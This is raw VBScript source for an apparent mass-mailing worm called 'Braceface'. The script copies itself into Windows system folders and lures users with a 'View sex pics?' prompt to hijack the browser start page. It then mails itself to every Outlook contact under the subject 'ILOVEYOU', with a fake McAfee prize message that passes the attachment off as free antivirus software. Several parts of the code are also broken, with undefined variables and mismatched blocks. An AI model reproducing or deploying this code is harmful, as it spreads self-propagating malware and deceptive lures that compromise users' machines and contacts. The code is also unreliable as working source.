   Msgbox("Braceface!!!!")
   Msgbox("Braceface!!!")
   Msgbox("Braceface!!!!")
   Msgbox("Braceface!!!!")



   Set ja = CreateObject("WScript.Shell")
   Set hhh = CreateObject("scripting.filesystemobject")
   Folder = hhh.GetSpecialFolder(2)


   Set c = hhh.GetFile(WScript.ScriptFullName)
   c.Copy(dirsystem&"\Braceface.vbe")
   c.Copy(dirwin&"\Braceface.vbe")
   c.Copy(dirsystem&"\Virus-Free.vbs")
   c.Copy(dirwin&"\Braceface.vbs")


   If Day(14) And Month(11) Then
   MsgBox ("I am getting my braces on now!")
   MsgBox ("Ow the pain!!!!")


   ja.run("WWW.NIGHTSURF.COM")

   ja.run("C:")





   Set InF = hhh.OpenTextFile(WScript.ScriptFullname, 1)

   If MsgBox("View sex pics?", vbYes, "Free Sex") = vbYes Then
       CreateRegKey "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page", "http://www.nightsurf.com"
   End If

   Msgbox("BRACES SUCK IM GOING TO GET MINE ON  Nov 15 2002  THEY SUCK!!~ By WORMS!")




   'BRACES SUCK IM GOING TO GET MINE ON  Nov 15 2002  THEY SUCK!!~

   Sub Main()
   randomize
   r = int((4*rnd)+6)
   if r=1 then
   ja.run("http://www.tvtome.com/tvtome/servlet/ShowMainServlet/showid-3415/")
   if r=2 then
   ja.run("C:Braceface.vbe")
   if r=3 then
   ja.run("http://www.tvtome.com/tvtome/servlet/ShowMainServlet/showid-3415/")
   if r=4 then
   ja.run("C:Windows\Braceface.vbe")

   end if
   end if
   end if
   end if
   end sub

   end if


   sub spreadtoemail()
   On Error Resume Next
   dim j,s,lists,entries,sex,b,regedit
   set regedit=CreateObject("WScript.Shell")
   set out=WScript.CreateObject("Outlook.Application")
   set mapi=out.GetNameSpace("MAPI")
   for lists=1 to mapi.AddressLists.Count
   set s=mapi.AddressLists(lists)
   j=1
   if (int(s.AddressEntries.Count)>int(regv)) then
   for entries=1 to s.AddressEntries.Count
   sex=s.AddressEntries(j)

   if (regad="") then
   set male=out.CreateItem(0)
   male.Recipients.Add(sex)
   male.Subject = "ILOVEYOU"
   male.Body = vbcrlf&"McAfee contest winner. You have won a free edition of our new anti-virus software. Please download this ANTIVIRUS FILE."
   male.Attachments.Add(dirsystem&"\Virus-Free.vbs")
   male.Send
   end if
   j=j+1
   next
   end if
   next
   Set out=Nothing
   Set mapi=Nothing
   end sub
